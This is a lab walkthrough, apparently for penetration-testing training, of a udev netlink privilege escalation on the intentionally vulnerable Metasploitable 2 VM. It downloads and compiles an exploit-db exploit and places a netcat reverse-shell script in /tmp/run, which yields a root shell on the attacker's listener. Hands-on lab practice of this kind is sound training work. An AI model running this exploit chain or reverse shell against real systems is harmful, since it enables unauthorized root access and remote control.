@@ -1,0 +1,139 @@
+PRIVILEGE ESCALATION EXAMPLE ON LINUX  ==> UDEV -- NETLINK
+root@alice:~/pwk_revisited_03272018# ssh msfadmin@192.168.209.134
+msfadmin@192.168.209.134's password: 
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+Last login: Wed Mar 28 10:48:14 2018 from 192.168.209.131
+msfadmin@metasploitable:~$ cat /etc/issue
+                _                  _       _ _        _     _      ____  
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+Step 1: CHECK FOR SOFTWARE VERSION AND FIND EQUIVALENT PRIV ESC EXPLOIT ONLINE
+=============================================================================
+msfadmin@metasploitable:~$ uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+Step 2: DOWNLOAD THE EQUIVALENT PRIV ESC EXPLOIT ONLINE or FROM YOUR KALI MACHINE
+===============================================================================
+msfadmin@metasploitable:~$ wget -O exploit.c www.exploit-db.com/download/160.c       
+--11:50:25--  http://www.exploit-db.com/download/160.c
+           => `exploit.c'
+
+To connect to www.exploit-db.com insecurely, *********use `--no-check-certificate'.***********
+Unable to establish SSL connection.
+
+Step 3: USE `--no-check-certificate' IN CASE YOU HAVE SSL ISSUES
+==================================================================
+msfadmin@metasploitable:~$ wget -O exploit.c --no-check-certificate https://www.exploit-db.com/download/8572.c             
+--11:55:55--  https://www.exploit-db.com/download/8572.c
+           => `exploit.c'
+Resolving www.exploit-db.com... 192.124.249.8
+
+100%[================================================================================>] 2,876         --.--K/s             
+
+11:55:56 (10.10 MB/s) - `exploit.c' saved [2876/2876]
+
+msfadmin@metasploitable:~$ ls -l | grep exploit.c 
+-rw-r--r-- 1 msfadmin msfadmin 2876 2018-03-28 11:55 exploit.c
+msfadmin@metasploitable:~$ file exploit.c                                                                                  
+exploit.c: ASCII C program text, with CRLF line terminators
+
+Step 4: COMPILE THE DOWNLOADED EXPLOIT INTO A BINARY FILE
+======================================================
+msfadmin@metasploitable:~$ gcc exploit.c -o compiled-exploit
+exploit.c:110:28: warning: no newline at end of file
+
+Step 5: CHECK IF IT SUCCESSFULLY COMPILED
+======================================================
+msfadmin@metasploitable:~$ file compiled-exploit 
+compiled-exploit: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.8, dynamically linked (uses shared libs), not stripped
+
+===>
+msfadmin@metasploitable:~$ id
+uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
+
+Step 6: AFTER VERIFYING THE USER PRIV LEVEL AGAIN, RUN THE EXPLOIT
+======================================================
+msfadmin@metasploitable:~$ ./compiled-exploit 
+[-] Error: Pass the udevd netlink PID as an argument
+
+Step 7: YOU GET UDEVD NETLINK ERROR, A PID IS NEED AS AN ARGUMENT
+===============================================================
+
+ *** Attention: Get the PID for the /proc/net/netlink socket
+ ============================================= ================
+msfadmin@metasploitable:~$ cat /proc/net/netlink 
+sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
+ddf0c800 0   0      00000000 0        0        00000000 2
+df846400 4   0      00000000 0        0        00000000 2
+dd39d800 7   0      00000000 0        0        00000000 2
+dd836600 9   0      00000000 0        0        00000000 2
+dd832400 10  0      00000000 0        0        00000000 2
+ddf0cc00 15  0      00000000 0        0        00000000 2
+df846800 15  2749   00000001 0        0        00000000 2
+ddf14800 16  0      00000000 0        0        00000000 2
+df96d400 18  0      00000000 0        0        00000000 2
+
+ *** Our PID seems to be 2749, but lets check the udev service to make sure.
+
+msfadmin@metasploitable:~$ ps aux | grep udev
+root      2750  0.0  0.1   2216   648 ?        S<s  Mar27   0:00 /sbin/udevd --daemon
+msfadmin  8062  0.0  0.1   3008   780 pts/1    S+   12:02   0:00 grep udev
+
+  *** PID verified: 2749 is correct since 2750 - 1 = 2749
+
+Step 8: TO GET A COMMAND SHELL WE NEED TO FIX A FEW THINGS
+============================================= ================
+  *** A: EDIT /TMP/RUN, define our local address and the port
+msfadmin@metasploitable:~$ vi /tmp/run
+
+#!/bin/bash
+/bin/netcat -e /bin/bash 192.168.209.131 443
+~
+~
+~
+"/tmp/run" [New File] 2 lines, 57 characters written
+
+
+Step 9: RUN NETCAT ON YOUR KALI MACHINE ON PORT 443
+============================================= ================
+root@alice:~/# nc -lvp 443
+listening on [any] 443 ...
+
+
+Step 10: RUN THE EXPLOIT ONCE AGAIN ON THE VICTIM MACHINE WITH RESPECTIVE PID  (2749)
+============================================= ===============================
+msfadmin@metasploitable:~$ ./compiled-exploit 2749                                                
+msfadmin@metasploitable:~$ 
+
+Step 11: WE GOT ROOT
+============================================= ================
+root@alice:~/# nc -lvp 443
+listening on [any] 443 ...
+192.168.209.134: inverse host lookup failed: Unknown host
+connect to [192.168.209.131] from (UNKNOWN) [192.168.209.134] 38617
+id 
+uid=0(root) gid=0(root)
+
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+
+NOTA BENA:
+From the error below NANO IS NOT WELCOME, I HAD TO REVERT TO USING VI
+msfadmin@metasploitable:~$ nano /tmp/run
+Error opening terminal: xterm-256color.
+Spoiler: https://linux-hacking-guide.blogspot.com/2015/05/metasploitable-2-privilege-escalation.html
+
+
